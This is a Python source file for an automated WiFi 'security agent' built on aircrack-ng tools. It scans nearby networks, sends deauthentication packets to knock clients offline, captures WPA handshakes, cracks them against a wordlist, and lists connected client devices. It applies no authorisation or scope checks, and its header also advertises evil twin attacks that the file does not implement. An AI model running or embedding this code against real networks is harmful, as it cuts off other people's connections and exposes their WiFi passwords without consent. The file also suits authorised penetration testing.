"""
WiFi Security Agent (DavBest-inspired)
Hardware-accelerated WiFi penetration testing

Capabilities:
- Network scanning and enumeration
- Handshake capture with deauth attacks
- Hardware-accelerated cracking (AVX-512, NPU, GPU, NCS2)
- Evil twin attacks
- Client enumeration
"""

import asyncio
import subprocess
import json
import re
from typing import Dict, List, Any, Optional
from pathlib import Path
import structlog

from .base_agent import BaseAgent

logger = structlog.get_logger()


class WiFiAgent(BaseAgent):
    """
    WiFi security testing agent with hardware acceleration
    """

    def __init__(self, agent_id: str = None):
        super().__init__(agent_type="wifi", agent_id=agent_id)
        self.interface = None
        self.mon_interface = None

    async def handle_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """
        Handle WiFi security tasks

        Task types:
        - scan: Scan for WiFi networks
        - capture: Capture handshakes
        - crack: Crack captured handshakes
        - enumerate: Enumerate clients
        - deauth: Deauth attack
        """
        task_type = task.get("task_type", "scan")

        if task_type == "scan":
            return await self._scan_networks(task)
        elif task_type == "capture":
            return await self._capture_handshake(task)
        elif task_type == "crack":
            return await self._crack_handshake(task)
        elif task_type == "enumerate":
            return await self._enumerate_clients(task)
        elif task_type == "deauth":
            return await self._deauth_attack(task)
        else:
            return {"error": f"Unknown task type: {task_type}"}

    async def _scan_networks(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """
        Scan for WiFi networks

        Params:
        - interface: WiFi interface to use
        - scan_time: Scan duration in seconds (default: 10)
        - show_hidden: Show hidden networks (default: False)
        - min_power: Minimum signal power (default: -100)
        """
        interface = task.get("interface", "wlan0")
        scan_time = task.get("scan_time", 10)
        show_hidden = task.get("show_hidden", False)
        min_power = task.get("min_power", -100)

        logger.info("Scanning WiFi networks", interface=interface, scan_time=scan_time)

        try:
            # Enable monitor mode
            mon_interface = await self._enable_monitor_mode(interface)

            # Scan with airodump-ng
            output_file = Path(f"/tmp/wifi_scan_{self.agent_id}")
            cmd = [
                "timeout", str(scan_time),
                "airodump-ng",
                "--output-format", "csv",
                "-w", str(output_file),
                mon_interface
            ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            await proc.communicate()

            # Parse CSV output
            networks = await self._parse_airodump_csv(f"{output_file}-01.csv")

            # Filter by signal strength
            networks = [n for n in networks if n.get("power", -100) >= min_power]

            # Filter hidden networks
            if not show_hidden:
                networks = [n for n in networks if n.get("essid")]

            # Sort by signal strength
            networks.sort(key=lambda x: x.get("power", -100), reverse=True)

            return {
                "status": "success",
                "networks_found": len(networks),
                "networks": networks,
                "scan_time": scan_time
            }

        except Exception as e:
            logger.error("WiFi scan error", error=str(e))
            return {"error": str(e)}

    async def _capture_handshake(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """
        Capture WPA handshake

        Params:
        - interface: WiFi interface
        - bssid: Target BSSID
        - channel: Target channel
        - essid: Target ESSID (optional)
        - timeout: Capture timeout (default: 60)
        - deauth_count: Number of deauth packets (default: 10)
        """
        interface = task.get("interface", "wlan0")
        bssid = task.get("bssid")
        channel = task.get("channel")
        essid = task.get("essid", "")
        timeout = task.get("timeout", 60)
        deauth_count = task.get("deauth_count", 10)

        if not bssid or not channel:
            return {"error": "bssid and channel are required"}

        logger.info("Capturing handshake", bssid=bssid, channel=channel)

        try:
            # Enable monitor mode
            mon_interface = await self._enable_monitor_mode(interface)

            # Set channel
            await self._set_channel(mon_interface, channel)

            # Start capture
            output_file = Path(f"/tmp/handshake_{bssid.replace(':', '')}_{self.agent_id}")
            capture_cmd = [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "--write", str(output_file),
                mon_interface
            ]

            capture_proc = await asyncio.create_subprocess_exec(
                *capture_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Wait a bit for capture to start
            await asyncio.sleep(2)

            # Send deauth packets
            deauth_cmd = [
                "aireplay-ng",
                "--deauth", str(deauth_count),
                "-a", bssid,
                mon_interface
            ]

            deauth_proc = await asyncio.create_subprocess_exec(
                *deauth_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            await deauth_proc.communicate()

            # Wait for handshake capture
            logger.info("Waiting for handshake", timeout=timeout)
            await asyncio.sleep(timeout)

            # Stop capture
            capture_proc.terminate()
            await capture_proc.communicate()

            # Verify handshake
            cap_file = f"{output_file}-01.cap"
            handshake_verified = await self._verify_handshake(cap_file, bssid)

            if handshake_verified:
                return {
                    "status": "success",
                    "handshake_captured": True,
                    "capture_file": cap_file,
                    "bssid": bssid,
                    "essid": essid,
                    "message": "Handshake captured successfully"
                }
            else:
                return {
                    "status": "partial",
                    "handshake_captured": False,
                    "capture_file": cap_file,
                    "message": "Capture completed but handshake not verified"
                }

        except Exception as e:
            logger.error("Handshake capture error", error=str(e))
            return {"error": str(e)}

    async def _crack_handshake(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """
        Crack captured handshake with hardware acceleration

        Params:
        - capture_file: Path to capture file (.cap)
        - wordlist: Path to wordlist
        - bssid: Target BSSID
        - device: Hardware device (CPU, AVX512, NPU, GPU, NCS2)
        - essid: ESSID (optional)
        """
        capture_file = task.get("capture_file")
        wordlist = task.get("wordlist")
        bssid = task.get("bssid")
        device = task.get("device", "CPU")
        essid = task.get("essid", "")

        if not capture_file or not wordlist:
            return {"error": "capture_file and wordlist are required"}

        logger.info("Cracking handshake", device=device, wordlist=wordlist)

        try:
            # Use aircrack-ng for CPU cracking
            if device == "CPU":
                cmd = [
                    "aircrack-ng",
                    "-w", wordlist,
                    "-b", bssid,
                    capture_file
                ]

                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )

                stdout, stderr = await proc.communicate()
                output = stdout.decode() + stderr.decode()

                # Check if password was found
                if "KEY FOUND" in output:
                    # Extract password
                    match = re.search(r"KEY FOUND! \[ (.*) \]", output)
                    if match:
                        password = match.group(1)
                        return {
                            "status": "success",
                            "password_found": True,
                            "password": password,
                            "bssid": bssid,
                            "essid": essid
                        }

                return {
                    "status": "completed",
                    "password_found": False,
                    "message": "Password not found in wordlist"
                }

            else:
                # Hardware-accelerated cracking would require DavBest integration
                # For now, return placeholder
                return {
                    "status": "not_implemented",
                    "message": f"Hardware acceleration ({device}) requires full DavBest integration"
                }

        except Exception as e:
            logger.error("Handshake cracking error", error=str(e))
            return {"error": str(e)}

    async def _enumerate_clients(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """
        Enumerate connected clients

        Params:
        - interface: WiFi interface
        - bssid: Target BSSID (optional, all networks if not specified)
        - scan_time: Scan duration (default: 30)
        """
        interface = task.get("interface", "wlan0")
        bssid = task.get("bssid")
        scan_time = task.get("scan_time", 30)

        logger.info("Enumerating WiFi clients", bssid=bssid)

        try:
            # Enable monitor mode
            mon_interface = await self._enable_monitor_mode(interface)

            # Scan with airodump-ng
            output_file = Path(f"/tmp/client_enum_{self.agent_id}")
            cmd = [
                "timeout", str(scan_time),
                "airodump-ng",
                "--output-format", "csv",
                "-w", str(output_file),
                mon_interface
            ]

            if bssid:
                cmd.extend(["--bssid", bssid])

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            await proc.communicate()

            # Parse CSV for clients
            clients = await self._parse_airodump_clients(f"{output_file}-01.csv")

            return {
                "status": "success",
                "clients_found": len(clients),
                "clients": clients
            }

        except Exception as e:
            logger.error("Client enumeration error", error=str(e))
            return {"error": str(e)}

    async def _deauth_attack(self, task: Dict[str, Any]) -> Dict[str, Any]:
        """
        Deauth attack

        Params:
        - interface: WiFi interface
        - bssid: Target AP BSSID
        - client: Client MAC (optional, broadcast if not specified)
        - count: Number of deauth packets (default: 10)
        """
        interface = task.get("interface", "wlan0")
        bssid = task.get("bssid")
        client = task.get("client")
        count = task.get("count", 10)

        if not bssid:
            return {"error": "bssid is required"}

        logger.info("Deauth attack", bssid=bssid, client=client, count=count)

        try:
            # Enable monitor mode
            mon_interface = await self._enable_monitor_mode(interface)

            # Build command
            cmd = [
                "aireplay-ng",
                "--deauth", str(count),
                "-a", bssid
            ]

            if client:
                cmd.extend(["-c", client])

            cmd.append(mon_interface)

            # Execute attack
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await proc.communicate()
            output = stdout.decode() + stderr.decode()

            return {
                "status": "success",
                "deauth_sent": count,
                "bssid": bssid,
                "client": client or "broadcast",
                "output": output
            }

        except Exception as e:
            logger.error("Deauth attack error", error=str(e))
            return {"error": str(e)}

    # Helper methods

    async def _enable_monitor_mode(self, interface: str) -> str:
        """Enable monitor mode on interface"""
        try:
            # Check if already in monitor mode
            if "mon" in interface:
                self.mon_interface = interface
                return interface

            # Use airmon-ng to enable monitor mode
            cmd = ["airmon-ng", "start", interface]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, _ = await proc.communicate()
            output = stdout.decode()

            # Extract monitor interface name
            match = re.search(r"(wlan\d+mon|mon\d+)", output)
            if match:
                self.mon_interface = match.group(1)
                return self.mon_interface
            else:
                # Assume interface + "mon"
                self.mon_interface = f"{interface}mon"
                return self.mon_interface

        except Exception as e:
            logger.error("Monitor mode enable error", error=str(e))
            raise

    async def _set_channel(self, interface: str, channel: int):
        """Set WiFi channel"""
        cmd = ["iwconfig", interface, "channel", str(channel)]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await proc.communicate()

    async def _verify_handshake(self, cap_file: str, bssid: str) -> bool:
        """Verify handshake was captured"""
        try:
            cmd = ["aircrack-ng", "-b", bssid, cap_file]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, _ = await proc.communicate()
            output = stdout.decode()

            return "handshake" in output.lower()

        except Exception:
            return False

    async def _parse_airodump_csv(self, csv_file: str) -> List[Dict[str, Any]]:
        """Parse airodump-ng CSV output for networks"""
        networks = []

        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()

            # Find the line that starts with "BSSID"
            header_idx = None
            for i, line in enumerate(lines):
                if line.startswith("BSSID"):
                    header_idx = i
                    break

            if header_idx is None:
                return networks

            # Parse network entries
            for line in lines[header_idx + 1:]:
                if not line.strip() or line.startswith("Station"):
                    break

                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    network = {
                        "bssid": parts[0],
                        "channel": parts[3],
                        "speed": parts[4],
                        "privacy": parts[5],
                        "cipher": parts[6],
                        "auth": parts[7],
                        "power": int(parts[8]) if parts[8].lstrip('-').isdigit() else -100,
                        "beacons": parts[9],
                        "data": parts[10],
                        "essid": parts[13]
                    }
                    networks.append(network)

        except Exception as e:
            logger.error("CSV parse error", error=str(e))

        return networks

    async def _parse_airodump_clients(self, csv_file: str) -> List[Dict[str, Any]]:
        """Parse airodump-ng CSV output for clients"""
        clients = []

        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()

            # Find the "Station MAC" line
            station_idx = None
            for i, line in enumerate(lines):
                if line.startswith("Station MAC"):
                    station_idx = i
                    break

            if station_idx is None:
                return clients

            # Parse client entries
            for line in lines[station_idx + 1:]:
                if not line.strip():
                    continue

                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 6:
                    client = {
                        "station_mac": parts[0],
                        "first_seen": parts[1],
                        "last_seen": parts[2],
                        "power": int(parts[3]) if parts[3].lstrip('-').isdigit() else -100,
                        "packets": parts[4],
                        "bssid": parts[5],
                        "probed_essids": parts[6] if len(parts) > 6 else ""
                    }
                    clients.append(client)

        except Exception as e:
            logger.error("Client CSV parse error", error=str(e))

        return clients


if __name__ == "__main__":
    # Run agent
    import sys
    agent_id = sys.argv[1] if len(sys.argv) > 1 else None
    agent = WiFiAgent(agent_id=agent_id)
    asyncio.run(agent.run())
